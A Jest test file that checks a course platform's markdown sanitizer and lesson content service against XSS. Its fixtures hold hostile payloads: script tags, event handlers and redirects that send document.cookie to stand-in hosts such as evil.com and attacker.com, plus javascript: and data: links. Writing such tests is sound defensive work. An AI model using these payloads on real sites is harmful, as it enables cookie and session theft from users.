import { markdownToSanitizedHtml } from "@/lib/sanitizer";
import * as lessonContentService from "@/services/lesson-content";
import * as lessonContentRepository from "@/repositories/lesson-content";
import * as authorizationService from "@/services/authorization";
import { CourseStatus } from "@prisma/client";

jest.mock("@/repositories/lesson-content");
jest.mock("@/services/authorization");

const mockLessonContentRepo = lessonContentRepository as jest.Mocked<
  typeof lessonContentRepository
>;
const mockAuthService = authorizationService as jest.Mocked<
  typeof authorizationService
>;

describe("Security Audit: XSS Sanitization & HTML Escaping Penetration Tests", () => {
  // ──────────────────────────────────────────────
  // 1. Direct Markdown / HTML Sanitizer Tests
  // ──────────────────────────────────────────────
  describe("1. Markdown to Sanitized HTML Pipeline", () => {
    it("neutralizes raw <script> execution tags", async () => {
      const hostilePayload = `
# Dangerous Lesson
<script>alert('XSS-ATTACK');</script>
<script src="https://evil.com/malicious.js"></script>
Regular markdown content.
      `;

      const cleanHtml = await markdownToSanitizedHtml(hostilePayload);

      expect(cleanHtml).not.toContain("<script");
      expect(cleanHtml).not.toContain("alert('XSS-ATTACK')");
      expect(cleanHtml).not.toContain("https://evil.com/malicious.js");
      expect(cleanHtml).toContain("Dangerous Lesson");
      expect(cleanHtml).toContain("Regular markdown content.");
    });

    it("strips inline event handlers from tags (onerror, onload, onclick, onmouseover)", async () => {
      const hostilePayload = `
<img src="x" onerror="alert(document.cookie)" />
<img src="https://example.com/image.png" onload="fetch('https://evil.com?c=' + document.cookie)" />
<b onmouseover="alert('hover')">Hover me</b>
<a href="https://example.com" onclick="stealData()">Safe looking link</a>
      `;

      const cleanHtml = await markdownToSanitizedHtml(hostilePayload);

      expect(cleanHtml).not.toContain("onerror");
      expect(cleanHtml).not.toContain("onload");
      expect(cleanHtml).not.toContain("onmouseover");
      expect(cleanHtml).not.toContain("onclick");
      expect(cleanHtml).not.toContain("stealData");
      expect(cleanHtml).not.toContain("document.cookie");
    });

    it("neutralizes javascript:, vbscript:, and data: pseudo-protocol schemes in links", async () => {
      const hostilePayload = `
[Malicious Link 1](javascript:alert(1))
[Malicious Link 2](jav&#x09;ascript:alert(2))
[Malicious Link 3](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
[Malicious Link 4](vbscript:msgbox(1))
[Valid Secure Link](https://learn.example.com/guide)
      `;

      const cleanHtml = await markdownToSanitizedHtml(hostilePayload);

      expect(cleanHtml).not.toContain('href="javascript:');
      expect(cleanHtml).not.toContain('href="data:');
      expect(cleanHtml).not.toContain('href="vbscript:');
      expect(cleanHtml).toContain('href="https://learn.example.com/guide"');
    });

    it("strictly isolates iframes to trusted video hosts (YouTube, Vimeo, Loom) over HTTPS", async () => {
      const hostilePayload = `
<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
<iframe src="https://player.vimeo.com/video/123456"></iframe>
<iframe src="https://www.loom.com/embed/abc123xyz"></iframe>
<iframe src="https://attacker.evil.com/phishing-login"></iframe>
<iframe src="http://www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
<iframe src="javascript:alert(1)"></iframe>
      `;

      const cleanHtml = await markdownToSanitizedHtml(hostilePayload);

      // Trusted HTTPS embeds should be preserved
      expect(cleanHtml).toContain("https://www.youtube.com/embed/dQw4w9WgXcQ");
      expect(cleanHtml).toContain("https://player.vimeo.com/video/123456");
      expect(cleanHtml).toContain("https://www.loom.com/embed/abc123xyz");

      // Untrusted domain, HTTP (insecure), and javascript protocol should be stripped
      expect(cleanHtml).not.toContain("attacker.evil.com");
      expect(cleanHtml).not.toContain("http://www.youtube.com");
      expect(cleanHtml).not.toContain("javascript:");
    });

    it("neutralizes dangerous HTML elements: object, embed, meta, base, link, svg", async () => {
      const hostilePayload = `
<object data="https://evil.com/exploit.swf"></object>
<embed src="https://evil.com/exploit.swf">
<meta http-equiv="refresh" content="0;url=https://evil.com">
<base href="https://evil.com">
<link rel="stylesheet" href="https://evil.com/phish.css">
<svg onload="alert('svg-xss')"><circle r="10"/></svg>
      `;

      const cleanHtml = await markdownToSanitizedHtml(hostilePayload);

      expect(cleanHtml).not.toContain("<object");
      expect(cleanHtml).not.toContain("<embed");
      expect(cleanHtml).not.toContain("<meta");
      expect(cleanHtml).not.toContain("<base");
      expect(cleanHtml).not.toContain("<link");
      expect(cleanHtml).not.toContain("<svg");
      expect(cleanHtml).not.toContain("svg-xss");
      expect(cleanHtml).not.toContain("exploit.swf");
    });

    it("enforces rel='noopener noreferrer' and target='_blank' on external links", async () => {
      const payload = `[Visit Antigravity](https://example.com)`;

      const cleanHtml = await markdownToSanitizedHtml(payload);

      expect(cleanHtml).toContain('target="_blank"');
      expect(cleanHtml).toContain('rel="noopener noreferrer"');
    });

    it("safely preserves legitimate educational markdown features", async () => {
      const validMarkdown = `
# Master Class: React & TypeScript

## Introduction
Here is an overview of **state machines** and *reducers*.

### Code Example
\`\`\`typescript
interface State {
  count: number;
}
function reducer(state: State): State {
  return { count: state.count + 1 };
}
\`\`\`

### Curriculum Checklist
- Component Architecture
- Performance Tuning
- Security Best Practices

| Module | Duration | Complexity |
|---|---|---|
| Architecture | 45m | Advanced |
| Security | 30m | High |

> Always sanitize untrusted input on the server before storage.
      `;

      const cleanHtml = await markdownToSanitizedHtml(validMarkdown);

      expect(cleanHtml).toContain(
        "<h1>Master Class: React &amp; TypeScript</h1>",
      );
      expect(cleanHtml).toContain("<h2>Introduction</h2>");
      expect(cleanHtml).toContain("<strong>state machines</strong>");
      expect(cleanHtml).toContain("<em>reducers</em>");
      expect(cleanHtml).toContain("<pre><code");
      expect(cleanHtml).toContain("interface State");
      expect(cleanHtml).toContain("<ul>");
      expect(cleanHtml).toContain("<li>Component Architecture</li>");
      expect(cleanHtml).toContain("<table>");
      expect(cleanHtml).toContain("<blockquote>");
    });
  });

  // ──────────────────────────────────────────────
  // 2. End-to-End Service Layer Sanitization Tests
  // ──────────────────────────────────────────────
  describe("2. LessonContentService End-to-End XSS Neutralization", () => {
    const instructorId = "instructor-secure-1";
    const lessonId = "lesson-secure-1";

    const mockHierarchy = {
      id: lessonId,
      title: "Secure Lesson",
      isFreePreview: false,
      moduleId: "module-1",
      module: {
        id: "module-1",
        courseId: "course-1",
        course: {
          id: "course-1",
          instructorId,
          status: CourseStatus.DRAFT,
        },
      },
    };

    beforeEach(() => {
      mockAuthService.requireAnyRole.mockResolvedValue();
      mockAuthService.hasRole.mockResolvedValue(false);
      mockLessonContentRepo.findLessonHierarchy.mockResolvedValue(
        mockHierarchy,
      );
    });

    it("sanitizes markdown content into bodyHtml before invoking repository upsert", async () => {
      const injectedMarkdown = `
# Heading with Malicious Code
<script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>
<img src="x" onerror="alert('pwned')" />
Safe educational notes.
      `;

      mockLessonContentRepo.upsertLessonContent.mockResolvedValue({
        id: "content-1",
        lessonId,
        bodyMarkdown: injectedMarkdown,
        bodyHtml: "",
        videoUrl: null,
        resources: null,
        createdAt: new Date(),
        updatedAt: new Date(),
      });

      await lessonContentService.updateLessonContent(instructorId, {
        lessonId,
        bodyMarkdown: injectedMarkdown,
      });

      expect(mockLessonContentRepo.upsertLessonContent).toHaveBeenCalledTimes(
        1,
      );

      const [passedLessonId, passedPayload] =
        mockLessonContentRepo.upsertLessonContent.mock.calls[0];

      expect(passedLessonId).toBe(lessonId);
      expect(passedPayload.bodyMarkdown).toBe(injectedMarkdown);

      // Verify the persisted HTML is completely sanitized
      const persistedHtml = passedPayload.bodyHtml ?? "";
      expect(persistedHtml).not.toContain("<script");
      expect(persistedHtml).not.toContain("document.location");
      expect(persistedHtml).not.toContain("onerror");
      expect(persistedHtml).not.toContain("pwned");
      expect(persistedHtml).toContain("Heading with Malicious Code");
      expect(persistedHtml).toContain("Safe educational notes.");
    });
  });
});
